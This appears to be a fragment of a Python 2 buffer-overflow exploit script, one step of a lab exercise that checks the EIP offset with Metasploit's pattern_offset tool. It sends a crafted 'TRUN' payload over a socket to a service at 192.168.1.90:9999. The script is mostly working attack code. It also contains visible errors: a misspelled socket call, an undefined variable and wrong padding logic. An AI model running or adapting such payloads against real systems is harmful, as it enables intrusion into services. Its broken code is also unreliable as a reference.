#!/usr/bin/python
### Check if the offset is correct with EIP_no

### 
### /usr/share/Metasploit-framework/tools/exploit/msf-pattern_ offset.rb -l 800 -q 42306142
### msf-pattern_offset -l 800 -q 42306142 (where the EIP point to)

### so we should see EIP: 42424242 


import sys, socket

shellcode = "A" + EIP_no + "B" * 4

try:
	s=socket.soket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.1.90',9999))
	s.send(('TRUN /.:/' + shellcode))
	s.close()
except:
	print "Error connecting to server"
	sys.exit()